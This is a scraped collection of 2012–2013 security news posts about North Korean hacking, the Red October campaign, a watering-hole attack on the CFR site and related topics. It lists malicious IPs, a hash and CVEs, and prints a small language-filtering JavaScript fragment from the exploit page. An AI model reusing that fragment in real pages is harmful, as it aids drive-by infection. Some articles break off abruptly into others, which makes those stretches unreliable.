warfare is strategic for the nation.\n\nLast year in internet have been published satellite photos of the area that is suspected to host  North Korea\u2019s \u2018No. 91 Office\u2019, a unit based in the Mangkyungdae-district of Pyongyang dedicated to computer hacking, its existence was revealed in a seminar on cyber terror in Seoul.\n\n\n\nNorth Korea is a little states that due its cyber capabilities and the affinity with Chinese PLA it could scare the West, we are in the cyber era and every body could became, through the proper investment and political choice, a giant.\n\nPierluigi Paganini\n\n2013/01/18 UPDATE\n\n\n\nThe presidential transition team that Thursday blamed North Korean hackers for an attack on its press room now says there was no hacking. It all appears to have been a misunderstanding.\n\nReporting on the reversal, Yonhap quoted an official on the team as saying the allegations stemmed from a disconnect in communications within the team.\n\n\u201cSecurity authorities had asked the administrative office of the transition committee to advise reporters to use antivirus programs and change passwords often as the press room is vulnerable to outside hacking attempts,\u201d spokesman Yoon Chang-jung said.\n\n\u201cThere was some misunderstanding in the course of delivering this,\u201d he said. \u2014 Yonhap News, January 17, 2013.\n\nSo in warning of a potential hacking attack, the message seems to have been misunderstood as a report of an actual hack.\n\nThe spokesman declined to say if there was any hacking attempt at all. \u2013 Yonhap News, January 17, 2013.\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/chinese-pla", "topic_name": "Chinese PLA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-defense", "topic_name": "cyber defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-era", "topic_name": "cyber era"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pyongyang", "topic_name": "Pyongyang"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/war", "topic_name": "war"}]}, {"news_name": "Red October, RBN and too many questions still unresolved", "news_link": "https://securityaffairs.co/wordpress/11779/cyber-crime/red-october-rbn-and-too-many-questions-still-unresolved.html", "title": "Red October, RBN and too many questions still unresolved\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 17, 2013", "body": "The recently discovered cyber espionage campaign \u201cRed October\u201d has shocked world wide security community, the principal questions raised are:\n\nTo try to understand who is behind the attacks it is necessary to evaluate the way the hackers have operated, they used old Java exploits to infect system from various sectors, in particular government agencies and diplomatic offices.\n\nAccording the first revelations of Kaspersky team the hackers could have a Russian origin, but they adopted exploits common in Chinese cyber espionage campaign, be aware this not means that Chinese government is involved.\n\nOne of exploits for the Microsoft Word documents had been used in previous spear-phishing campaign aimed at Tibetan activists according to Kaspersky experts, the hackers behind the Red October operation have just changed the executable that was embedded in the document.\n\nSymantec experts declared:\n\n\u201cThis is not the first time that a high-profile attack campaign has used spear phishing emails and, as a popular method, it likely will not be the last . However, we are now seeing increased adoption of watering hole attacks being used in campaigns (compromising certain websites likely to be visited by the target organization).\u201d\n\nKaspersky researchers verified two exploits for Microsoft Word flaws (CVE-2010-3333 and CVE-2012-0158) flaws and one exploit for an Excel vulnerability (CVE-2009-3129), all patched prior to attacks between May 2010 and December 2012.\n\nThe malware is without doubt the work of professionals that have targeted various platforms and vendors in many countries mainly localized in Eastern Europe.\n\n\n\nRed October\u2019s primary attack methods relied on exploits for flaws in Microsoft documents typically sent via email, one tested scheme. What is sure is that the attackers have evolved their methods of attack over the time using every time new exploit to target also vulnerabilities recently found such as the Java (CVE-2011-3544) flaw, patched by Oracle in October 2011.\n\nThe circumstance that is concerning is that none of the exploits used for the Red October attacks were zero days vulnerabilities.\n\nKaspersky researchers identified that at least three different known vulnerabilities have been exploited\n\nThe security researchers from Seculert have discovered the usage of another delivery vector in the Red October attacks that allows the attackers to infiltrated victim network(s) via Java exploitation (MD5:35f1572eb7759cb7a66ca459c093e8a1 \u2013 \u2018NewsFinder.jar\u2019), known as the \u2018Rhino\u2019 exploit\n\n\n\nAnother interesting data provided by the investigation is that oldest domain name used in the Red October network was registered in November, 2007, and the newest in May, 2012.\n\nIn January 16th Kaspersky team published a new post on the investigation \u201cRed October \u2013 Java Exploit Delivery Vector Analysis\u201d in which is revealed that the early February 2012 timeframe that hackers would have used \u2018Rhino\u2019 exploit. It seems that this vector was not heavily used by the attackers, in fact when the security experts downloaded the php used to serve the \u2018.jar\u2019 malcode archive, the line of code delivering the java exploit was commented out.\n\nThe post states:\n\n\u201cThe domain involved in the attack is presented only once in a public sandbox at malwr.com (http://malwr.com/analysis/c3b0d1403ba35c3aba8f4529f43fb300/), and only on February 14th, the very same day that they registered the domain hotinfonews.com. Following that quick public disclosure, related MD5s and links do not show up in public or private repositories, unlike the many other Red October components.\n\nWe could speculate that the group successfully delivered their malware payload to the appropriate target(s) for a few days, then didn\u2019t need the effort any longer. Which may also tell us that this group, which meticulously adapted and developed their infiltration and collection toolset to their victims\u2019 environment, had a need to shift to Java from their usual spearphishing techniques in early February 2012. And then they went back to their spear phishing.\u201d\n\nIt becomes clear the importance of the discovery, probably this is one of the most extended cyber espionage campaign, what is singular, as observed by Kaspersky in its last post, is that it hasn\u2019t detected any PDF exploits yet, which common for this kind of operations.\n\nCostin Raiu, director of Kaspersky\u2019s global research and analysis team, declared that other methods of distributing the cyberespionage malware might have been used although they are not yet identified.\n\nJeffrey Carr, founder and CEO of Taia Global, Inc, published an excellent post on his blog making interesting observations on the event.\nMalicious servers\n178.63.208.49  matches to 178.63.\n188.40.19.247 matches to 188.40.\n78.46.173.15 matches to 78.46.\n88.198.30.44 matches to 88.198.\n\nMini-motherships\n91.226.31.40 matches to 91.226.\n\nI agree with Carr when he assumed a collaboration of RBN with Russian government, probably the RBN never stopped its action but simply operated below the radar.\n\nRussia has always been known for its skill in virus design, just to provide some samples Bagel, Netsky  and MyDoom. RBN in considered a cybercrime company able to provide any kind of malicious service such as  phishing, DDoS, malware hosting, gambling and child pornography.\n\n\n\n \n\nCarr states:\n\n\u201cIt provides distance and deniability to the FSB (Federal Security Service of the Russian Federation) for certain offensive cyber operations and, in exchange, the FSB allows the RBN to operate as a criminal enterprise; a portion of which involves selling the data that it steals to whomever is interested.\u201d \n\nI agree with Carr when he assumes that Kaspersky is one of the most important discoveries of the decade.\n\nTo the RBN are recognized multiple skills\n\nthat make the organization very dangerous\n\n\n\nMany exponents of worldwide security comminity believe that Red October campaign is the work of a group of cyber criminals that are collecting high-value information to sell subsequently to interested parties. Of course governments and intelligence agencies could be most interested in the information stolen.\n\nIn the post \u201cEvery Month is Red October\u201d probably is provided the answer to the second question, the article in fact reiterates that security firms  \u201csee thousands of similar documents in our systems every month. The Red October attacks are interesting because of the large scale of the espionage done by a single entity, and the long timespan they cover. However, the sad truth is that companies and governments are constantly under similar attacks from many different sources. In that sense, this really is just everyday life on the Internet.\u201d\n\nIt \u2018s really impossible to avoid similar incidents despite the fact that AV systems installed are update?\n\nReferring to the third question that is impossible to answer without proof \u2026 is it possible that some government had done pressure on AV manufacturers in exchange for \u201cfavors\u201d to make sure that some threats do their course?\nDespite this theory could appear extremely imaginative it is shared by many conspirationists and for this reason we could ignore it\u2026often the reality surpasses the imagination.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/phishing", "topic_name": "phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rbn", "topic_name": "RBN"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/red-october", "topic_name": "Red October"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rhino-exploit", "topic_name": "Rhino exploit"}]}, {"news_name": "Kaspersky Lab discovered the cyber espionage campaign \u201cRed October\u201d", "news_link": "https://securityaffairs.co/wordpress/11729/hacking/kaspersky-lab-discovered-the-cyber-espionage-campaign-red-october.html", "title": "Kaspersky Lab discovered the cyber espionage campaign \u201cRed October\u201d\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 15, 2013", "body": "Last October Kaspersky Lab\u2019s Global Research & Analysis Team started a new investigation after several attacks hit computer networks of various international diplomatic service agencies.\n\nThe attacks appeared very suspect, a new large scale cyber-espionage operation has been discovered, the operation is dubbed \u00abRed October\u00bb, a name inspired by famous novel \u00abThe Hunt For The Red October\u00bb (ROCRA).\n\nThe operation was conducted to acquire sensitive information from diplomatic, governmental and scientific research organizations in many countries, mostly of them of Eastern Europe, former USSR members and countries in Central Asia. The campaign hit hundreds of machines belonging to following categories:\n\n\n\nCompared to Aurora and Night Dragon, Rocra is more complex because uses more sophisticated malware able to evade detection during last 5 years while continuing to stealing hundreds of Terabytes by now.\n\n \n\n\n\n \n\nDifferently from other cyber espionage campaigns discovered in the past, Red October has targeted various devices such as enterprise network equipment and mobile devices (Windows Mobile, iPhone, Nokia), hijacking files from removable disk drives, stealing e-mail databases from local Outlook storage or remote POP/IMAP server and siphoning files from local network FTP servers.\n\nWhat is upsetting is that evidence collected demonstrate that cyber-espionage campaign was started  since 2007 and is still active. During the last 5 years a huge quantity of data has been collected, the obtained information, such as service credentials, has been reused in later attacks.\n\nThe Kaspersky Lab blog post states\n\n\u201cThe campaign, identified as \u201cRocra\u201d, short for \u201cRed October\u201d, is currently still active with data being sent to multiple command-and-control servers, through a configuration which rivals in complexity the infrastructure of the Flame malware. Registration data used for the purchase of C&C domain names and PE timestamps from collected executables suggest that these attacks date as far back as May 2007.\u201d\n\nThe control structure discovered is very complex and extended, more than 60 domain names and several servers hosting located in many countries mainly Germany and Russia. A particularity of the C&C architecture is that the network is arranged to hide the mothership-server true proxy functionality of every node in the malicious structure.\n\nC&C architecture\n\nSecurity experts were able to sinkhole around 10% of the domains, during the period 2 Nov 2012 \u2013 10 Jan 2013 were registered over 55,000 connections to the sinkhole from 250 different victim\u2019s IPs from 39 different countries,with most of IPs being from Switzerland. Kazakhstan and Greece follow next.\n\nRed October Geo-distribution of victims\n\n \n\nWhich are the vulnerabilities exploited in the attacks?\n\nThe security expert discovered that at least three different known vulnerabilities have been exploited\n\nEvidences collected during the investigation, let security specialists to believe that attackers have Russian origins, but strangely they appear unrelated to any other cyber attacks detected until now.\n\nThese attacks are structured in two distinct phases according a classic schema of targeted attacks:\n\nIn the initial phase the malware is delivered via e-mail as attachments (Microsoft Excel, Word and, probably PDF documents), once victims opened the malicious document the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C&C servers,  after the malware receives from the C&C server a number of additional spy modules.e-mail as attachments (Microsoft Excel, Word and, probably PDF documents), once victims opened the malicious document the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C&C servers,  after the malware receives from the C&C server a number of additional spy modules.\n\nThe way to infect the entire network is very efficient, the hackers used a module to scan target infrastructure searching for vulnerable machines.\n\n\u201cThe main malware body acts as a point of entry into the system which can later download modules used for lateral movement. After initial infection, the malware won\u2019t propagate by itself \u2013 typically, the attackers would gather information about the network for a few days, identify key systems and then deploy modules which can compromise other computers in the network, for instance by using the MS08-067 exploit.\u201d\n\nThe attacks against each machine and related services is made exploiting the above vulnerabilities or gaining access to it using credentials collected during other attacks of the same campaign. The exploits appear to have been created by Chinese hackers.\n\nOnce again the group of Kaspersky has identified a campaign of cyber espionage, excellent analytical work to tight deadlines.\nWhat alarms me is that such campaigns could be going on for years with disastrous consequences \u2026 what to do at this point? \u2026 what to do at this point? What to do at this point?\n\nHow is it possible that an operation so extended escape for so long to worldwide security community?\n\nWho is behind the attacks? Cyber criminals or state-sponsored hackers?\n\nWill we be forced to ban the use of our computers in critical sector such as diplomatic?\n\nPierluigi Paganini\n\nJeffrey Carr, founder and CEO of Taia Global, Inc, posted on his blog\n\nThe developers behind ROCRA, who are Russian, are comfortable using Chinese malware and adapting it for their own use according to the Kaspersky report. This fits the RBN profile to a \u2018t\u2019. I ran 13 IPs listed in Kaspersky\u2019s report against the RBN list maintained by James McQuade and found matching IP blocks for five of them:\n\nMalicious servers\n\n178.63.208.49  matches to 178.63.\n\n188.40.19.247 matches to 188.40.\n\n78.46.173.15 matches to 78.46.\n\n88.198.30.44 matches to 88.198.\n\nMini-motherships\n\n91.226.31.40 matches to 91.226.\n\nIt has been my belief for many years that the RBN has a working relationship with the Russian government; that it disappeared from view when the FBI sought the assistance of the FSB to shut down their operations in 2007 (as detailed in chapter 8 of my book); and that it has continued operating below the radar all this time. It provides distance and deniability to the FSB for certain offensive cyber operations and, in exchange, the FSB allows the RBN to operate as a criminal enterprise; a portion of which involves selling the data that it steals to whomever is interested.Red October is already the most significant find of the new year. If, in fact, Kaspersky has uncovered an RBN-controlled espionage ring, it\u2019s going to be one of the most important discoveries of the decade.\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/red-october", "topic_name": "Red October"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rocra", "topic_name": "ROCRA"}]}, {"news_name": "New security problem for Oracle Java software", "news_link": "https://securityaffairs.co/wordpress/11696/cyber-crime/new-security-problem-for-oracle-java-software.html", "title": "New security problem for Oracle Java software\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 12, 2013", "body": "The year is start way for Oracle Java platform, a new Java 0-day vulnerability has been discovered and worldwide security community is very concerned on the potential effect of the bug.

A key technical challenge is the development of techniques to ensure that such proofs are composable, allowing the construction of high-assurance systems out of high-assurance components.\n\nDrones control systems, SCADA systems and medical devices share the possibility to be victim of a cyber attacks such as a malware infection, event such as Stuxnet case and the various news on hijacking of drones remind us that hackers could exploit these complex systems to the leak of secure coding.\n\nFisher during a presentation of her study declared:\n\n\u201cMany of these systems share a common structure: They have an insecure cyber perimeter, constructed from standard software components, surrounding control systems designed for safety but not for security,\u201d \n\nBut it\u2019s known, the perfect code it\u2019s hard to realize, and need a long and complex work that involve high skilled personnel, to give an idea of the complexity for code validation and its analysis let\u2019s remind that one group of researchers in Australia has checked the core of their \u201cmicrokernel\u201d composed by 8,000 lines of code with a workload of 11 persons for one year, it\u2019s an amazing time if we consider the time to market of military devices and the overall complexity of any component of a vehicle.\n\nThe overall project will have a duration of  4.5 years split into three 18-month phases and is composed of 5 Technical Areas (TAs)\n\n \n\n \n\n\n\n \n\nGovernment is interested to the definition in military sector of  tools and formal methods-based techniques to develop secure control algorithms for the creation of secure defense vehicles. The final control algorithms will be tested on various defense vehicles such as Rockwell Collins drones, Boeing helicopters and Black-I-Robotics ground robots, but the project is more ambitious, it has as final goal the definition of \u201ca software that can write near-flawless code on its own\u201d.\n\nReading the presentation of the HACMS program I was attracted by the Technical Area 5: Red Team (\u201cVoice of the Offense\u201d) that includes the static and dynamic assess security of the targeted vehicles. The phase also include a specific task on attacks based on injection of arbitrary code in the systems and the providing of  bogus values to the sensors of the vehicle. These were the most dangerous type of attacks observed until now, the program is also interested to preserve mission objectives from hacker attacks that could reveal sensible information during a conflict such as goal of the mission (e.g. reconnaissance or bombing), the locations of the troops on the territory and final targets of the attacks.\n\nThe deliverables of HACMS will be a set of publicly available tools integrated into a high-assurance framework, which will be distributed for use in both the military and commercial software sectors, the purpose is to promote these tools to generate, high-assurance and open-source operating system and control system components.\n\n \n\n\n\n \n\nIf the project will works it could represents a turning point in history, we will be able to design drones not attacked by hackers, we are very close to creating the perfect machine, and in this case what are the ethical implications related to human control in the decision-making loop of these vehicles?\n\nIs it really possible the hypothesized scenario, is this our real goal?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darpa", "topic_name": "DARPA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/drones", "topic_name": "Drones"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacms", "topic_name": "HACMS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pervasive-vulnerabilities", "topic_name": "pervasive vulnerabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pervasive-vulnerability", "topic_name": "pervasive vulnerability"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-cyber-attacks", "topic_name": "state-sponsored cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Cyberespionage, another watering hole attack against US website", "news_link": "https://securityaffairs.co/wordpress/11405/intelligence/cyberespionage-another-watering-hole-attack-against-us-website.html", "title": "Cyberespionage, another watering hole attack against US website\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 31, 2012", "body": "It\u2019s Christmas time everywhere but cyberspace there isn\u2019t holiday time for governments, last week a new cyber espionage attack has been detected, the website for the Council on Foreign Relations (CFR) was compromised.\n\nThe CFR is a strategic target for espionage, it is one of the most elite foreign policy organizations in the United States with a membership of some 4,700 officials, former officials, journalists, and others.\n\nThe institutional website was used to exploit a new Internet Explorer zero-day vulnerability in Windows machine of the users,  the technique used, dubbed watering hole attack, is not new, security experts described it as part of a cyber espionage campaign named   \u201cThe Elderwood Project\u201d dating back to 2009 and detailed in a publication of Symantec in September 2012.\n\nThe \u201cwatering hole\u201d attack consists to inject malicious code onto the public Web pages of a site that the targets use to visit. The method of injection is commonly used by cyber criminals and hackers, the main difference between their use in cybercrime and in watering hole attacks is related to the choice of websites to compromise and use in the attacks. The attackers haven\u2019t indiscriminately compromised any website but they are focused choosing websites within a particular sector so as to infect persons of interest who likely work in that same sector and are likely to therefore visit related websites.\n\nThe Symantec report states:\n\n\u201cTargeting a specific website is much more difficult than merely locating websites that contain a vulnerability. The attacker has to research and probe for a weakness on the chosen website. Indeed, in watering hole attacks, the attackers may compromise a website months before they actually use it in an attack. Once compromised, the attackers periodically connect to the website to ensure that they still have access. This way, the attackers can infect a number of websites in one stroke, thus preserving the value of their zero-day exploit. They are even in a position to inspect the website logs to identify any potential victims of interest. This technique ensures that they obtain the maximum return for their valuable zero-day exploit.\u201d\n\nOnce a victim visits the compromised site, the software for which the 0-days have been designed will make possible the infection of the machine.\n\nThe cyber espionage campaign seems to be originated, once again, from China and principal security firms have received  multiple reports of a new Internet Explorer zero-day vulnerability being exploited in the wild, the compromised site was used to infect machines serving up the zero day exploit as far back as December 21st.\n\nThe FireEye security company published a blog post on the attack, hackers have deployed on the website the malicious code that allow exploiting of Internet Explorer version 8.0 (fully patched version).\n\n\u201cWe can also confirm that the malicious content hosted on the website does appear to use Adobe Flash to generate a heap spray attack against Internet Explorer version 8.0 (fully patched), which was the source of the zero-day vulnerability. We have chosen not to release the technical details of this exploit, as Microsoft is still investigating the vulnerability at this time.\u201d\n\nAn interesting feature of the JavaScript hosting the exploit is that it only served the malicious code to browsers whose language was either English (U.S.), Chinese (China), Chinese (Taiwan), Japanese, Korean, or Russian:\n\nvar h=navigator.systemLanguage.toLowerCase();\nif(h!=\u201dzh-cn\u201d && h!=\u201den-us\u201d && h!=\u201dzh-tw\u201d && h!=\u201dja\u201d && h!=\u201dru\u201d && h!=\u201dko\u201d)\n{\n  location.href=\u201dabout:blank\u201d;\n}\n\nThe blog reports the details of infection method:\n\n\u201cOnce those initial checks passed, the JavaScript proceeded to load a flash file today.swf, which ultimately triggered a heap spray in Internet Explorer in order to complete the compromise of the endpoint. Once the browser is exploited, it appears to download \u201cxsainfo.jpg,\u201d which is the dropper encoded using single-byte XOR (key: 0x83, ignoring null bytes).\u201c\n\nFireEye experts revealed that In description parameter of MD5 of malicious files  they found simplified Chinese <\u6587\u4ef6\u8bf4\u660e> , that translates to <File Description>.\n\nWaterhole_Attack from Symantec\n\nThe malicious code has been removed but it is not clear if the operation has been done by attackers to prevent further analysis or by the manager of CFR website that detected the malware.\n\nSymantec security experts reported in a post:\n\n\u201cA flash file named today.swf was used to trigger the vulnerability in Internet Explorer. The flash file is detected asTrojan.Swifi and protection has been in place for our customers since December 21st. Further details and analysis will be provided soon.\u201d\n\nThe Council on Foreign Relations spokesman, David Mikhail, declared:\n\n\u201cThe Council on Foreign Relations\u2019 website security team is aware of the issue and is currently investigating the situation,\u201d \u201cWe are also working to mitigate the possibility for future events of this sort.\u201d\n\n \n\n \n\nMicrosoft has officially acknowledged the exploited vulnerability in an official advisory, which contains some advice to mitigate the threat from the flaw to the browser, the company confirmed that browser IE versions 9 and 10 are not impacted.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyberespionage", "topic_name": "Cyberespionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-elderwood-project", "topic_name": "The Elderwood Project"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/watering-hole-attack", "topic_name": "watering hole attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-vulnerability", "topic_name": "zero-day vulnerability"}]}, {"news_name": "Hacktivism and web monitoring in 2013 for Security Affairs", "news_link": "https://securityaffairs.co/wordpress/11391/hacking/hacktivism-and-web-monitoring-in-2013-for-security-affairs.html", "title": "Hacktivism and web monitoring in 2013 for Security Affairs\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 30, 2012", "body": "The year is ending and it\u2019s very easy to read forecast for next year, experts are sure that we will assist to a sensible increase of state-sponsored attacks and to the raise of sophisticated malware, both cyber threats will exploit large scale channels such as mobile and social networks.\n\nThe majority of forecast are focused on the above considerations but in my opinion we cannot avoid a couple of factors that will continue to influence in meaningful way the user\u2019s experience in the cyberspace, the hacktivism and the government control.\n\nThe last couple of years are full of events that demonstrated the great power of hacktivism, groups of hackers that are able to raise the attention on political choices and that in many case have created serious problems to governments and intelligence agencies all over the world. Ignore the hacktivism phenomenon, underestimate the Anonymous collective is presumptuous and unconscious, this guys, despite operating in a questionable way for some, are now the only reality in cyberspace that addresses uncomfortable issues that in many cases even the press avoids talking.\n\nDuring 2012 operations such as #OpOWS, #OpPedoChat and #opJapan demonstrated the influence of the group on cyber security , but there are security firms such as McAfee that are not convicted that 2013 will observe the decline of Anonymous.\n\nOn a blog post on its annual Threat Predictions report the company states:\n\nHacktivism \u2013 The decline of Anonymous\n\nDue to many uncoordinated and unclear operations and false claims, the Anonymous hacktivist movement will slow down in 2013. Anonymous\u2019 level of technical sophistication has stagnated and its tactics are better understood by its potential victims, and as such, the group\u2019s level of success will decline. While hacktivist attacks won\u2019t end in 2013, if ever, they are expected to decline in number and sophistication.\n\nNation states and armies will be more frequent actors and victims of cyberthreats. Patriot groups self-organized into cyberarmies have had little impact up until this point, but their actions will improve in sophistication and aggressiveness. In 2013, many more of the world\u2019s military units will be on the front line of social networks communicating more frequently. State-related threats will increase and make the headlines while suspicions about government-sponsored attacks will grow.\n\nI believe such unfounded claims that soon will be denied, the dissent is rampant, social groups like Anonymous collect followers more than any other political force, so why does McAfee think to a decline of Anonymous? I may be wrong, but I completely disagree with McAfee. A cyber attack, a data breach and also a DDoS has a sensible impact on the victims, ignore it is dangerous!  Are we really able to protect our systems? The answer is no, and current events prove it, the higher the technological content of our solutions, more they are vulnerable to cyber attacks that exploit vulnerabilities hard to find.\n\nExperts in McAfee in my opinion are not considering the impact of global economic crisis that lead companies to consider security as a cost, old and un managed systems in many cases are exposed to hacktivists and cyber criminals, it\u2019s easy to predict the raise of the number of attacks of these components.\n\nLet\u2019s pass to second element I consider determinant for next year, government control will increase in sensible way, the imperative is spy-on everybody!\n\n\n\nThe popular hacktivist and Wikileaks volunteer Jacob Appelbaum opened the annual hacker meeting, the Chaos Computer Club conference, warning on the rapid building up of surveillance networks. Appelbaum has spoken about the ambitious U.S. data center, managed by NSA, that has the purpose to spy on everybody, an attack on human dignity.\n\n\u201cAppelbaum urged citizens to \u201cresist the surveillance state\u201d and rejected the notion that only people who have something to hide should fear government snooping and eavesdropping.\u201d\n\nI believe that is normal that a government monitors internet for homeland security but the obsession to collect any kind of information, or worse exercise control on published content in not acceptable.\n\nFreedom of expression in a civilized society must be an unquestionable right and the direction taken by governments is opposite \u2026 Fortunately, the technology offers tools to circumvent censorship and control, learn to know them, and to use them, it is a small step toward freedom.\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/2013", "topic_name": "2013"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breach", "topic_name": "data breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mobile", "topic_name": "mobile"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring", "topic_name": "monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-2", "topic_name": "social networks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attacks", "topic_name": "state-sponsored attacks"}]}, {"news_name": "DoJ wants to indict state-sponsored hackers.

High officials of foreign governments that arrange and coordinate cyber attacks against US networks can be persecuted like any other criminal, despite that doesn\u2019t mean there\u2019s an expectation that he\u2019ll ever be brought to court. Carlin reiterated that similar procedure have been already applied, in 2011 an Iranian Al Qods official was charged with conspiring to kill Saudi Arabia\u2019s ambassador to the U.S.\n\nIf the indictments could be not very effective from the point of view of hackers persecution it is fundamental in all those cases in which intellectual properties are stolen from companies and used for the production of products with high technological content, it is the case of a private company that uses stolen technology and due this reason it could be charged.\n\n \u201cWhether it is a state-owned enterprise or a state-supported enterprise in China \u2014 if you can figure out and prove that they\u2019ve committed the crime, charging the company means they can\u2019t do business in the U.S., or in Europe,\u201d \u201cIt affects their reputation and that then causes them to recalculate: \u2018Hey, is this worth it?\u2019\u201d Carlin said\n\nRecently the Defense Security Services published a report \u201cTarget US Technologies 2012\u201d that proposes an analysis of foreign attempts to obtain illegal of unauthorized access to sensitive or classified information and technology resident in the US.\n\n\u201cDSS mission is to support national security and the warfighter, to secure the nation\u2019s technological base, and oversees\u201d\n\nThe East Asia and The Pacific accounted for 43% of total, the Near East  for 18%, Europe and Eurasia  for 13% and South and Central Asia for remaining, the alarming data is related to the increase of number of reports received from industry that is around 75% more respect previous year (2010).\n\n \n\n\n\n \n\nAnother concerning factor is related the expansion of the degree of interaction between collectors despite their different origin.\n\nThe order of the regions linked to the most prolific collectors of U.S. information and technology remained unchanged from fiscal year 2010 (FY10), commercial remained the most common collector affiliation and the top four most targeted technology categories remained the same (information systems (IS), lasers/optics/sensors (LO&S), aeronautics systems, and electronics).\n\n\n\n \n\n\u201cIn FY11, suspicious network activity (SNA) was the most prevalent collection MO for entities originating from East Asia and the Pacific; SNA figured no more prominently than fifth in any other region. Due to the nature of SNA, it remains difficult to attribute such collection attempts to an entity or even to a region of origin.\u201d\n\nThe data proposed give an idea of the amplitude of the phenomena, from a technological point of view it\u2019s hard to defend sensitive information from constant attack of foreign governments that\u2019s why The Justice Department is thinking to \u201cpersecution\u201d and \u201cindictment\u201d, the unique ways to mitigate risk of theft of intellectual property.\n\nCompanies that steal technological knowledge shall be charged and be penalized in the possibility of sale of their products and services. I believe, however, that this approach does not lead to a complete solution of the phenomenon of cyber espionage, consider the fact that most times intellectual property stolen is used for the internal market of the nations who commit the crime, as it is also confirmed by the most affected sectors . Generally the theft of information in areas such as defense and military is used to bridge the technological gap towards technologically advanced countries.\n\nThe initiative of the DOJ is a first step but certainly not resolutive.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/doj", "topic_name": "DoJ"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nscs", "topic_name": "NSCS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-cyber-attacks", "topic_name": "state-sponsored cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Perfect Citizen, US vulnerability assessment program on critical infrastructures", "news_link": "https://securityaffairs.co/wordpress/11256/intelligence/perfect-citizen-us-vulnerability-assessment-program-on-critical-infrastructures.html", "title": "Perfect Citizen, US vulnerability assessment program on critical infrastructures\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 24, 2012", "body": "CNET web site has published a news on a secret National Security Agency program named Perfect Citizen that is targeting on large-scale the control systems inside utilities, including power grid and gas 